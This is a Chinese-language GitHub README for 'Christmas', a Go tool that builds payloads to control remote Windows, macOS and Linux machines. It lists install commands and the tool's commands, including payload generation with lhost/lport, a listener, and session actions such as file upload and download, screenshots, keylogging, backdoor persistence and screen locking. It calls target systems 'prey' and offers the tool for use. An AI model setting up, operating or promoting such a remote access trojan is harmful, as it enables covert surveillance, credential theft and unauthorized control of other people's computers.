<p align="center">
  <img src="https://github.com/HexChristmas/Christmas/blob/master/content/logo.png">
</p>

<h1 align="center">Christmas Payload Generator</h1>
<p align="center">
  <a href="https://golang.org/">
    <img src="https://img.shields.io/badge/Golang-1.11-blue.svg">
  </a>
  <a href="https://github.com/HexChristmas/Christmas/blob/master/LICENSE">
    <img src="https://img.shields.io/badge/License-BSD%203-lightgrey.svg">
  </a>
  <a href="https://github.com/HexChristmas/Christmas/blob/master/main.go">
    <img src="https://img.shields.io/badge/Release-3.0-red.svg">
  </a>
    <a href="https://opensource.org">
    <img src="https://img.shields.io/badge/Open%20Source-%E2%9D%A4-brightgreen.svg">
  </a>
</p>

<p align="center">
  Christmas可以生成有效负载并控制远程操作系统的Poc。
</p>

## 如何安装
```bash
$ go get github.com/HexChristmas/Christmas
$ go get github.com/kbinani/screenshot
$ go get github.com/lxn/win
$ go get github.com/matishsiao/goInfo
$ go get golang.org/x/sys/windows
$ cd ~/go/src/github.com/HexChristmas/Christmas
$ go run main.go
```

## 如何使用

命令    | 参数及介绍
:-----      |:-----
`generate`  |生成负载 (```e.g```. `generate lhost=192.168.0.100 lport=8080 fname=chaos --windows`)
`lhost=`    |指定猎物ip
`lport=`    |指定猎物端口
`fname=`    |指定输出文件
`--windows` |猎物系统为``` Windows```
`--macos`   |猎物系统为 ```Mac OS```
`--linux`   |猎物系统为 ```Linux```
`listen`    |从猎物的另一个端口监听 (```e.g```. `listen lport=8080`)
`serve`     |服务文件
`exit`      |退出

命令    | 参数及介绍
:-----                  |:-----
`download`              |下载文件
`upload`                |上传文件
`screenshot`            |截屏
`keylogger_start`       |键盘记录
`keylogger_show`        |输出键盘记录内容
`persistence_enable`    |维持访问之插后门
`persistence_disable`   |移除后门
`getos`                 |获取系统名称
`lockscreen`            |锁定猎物屏幕
`openurl`               |打开通知的```URL```
`bomb`                  |鱼叉炸弹
`clear`                 |清屏
`back`                  |挂起会话
`exit`                  |关闭会话
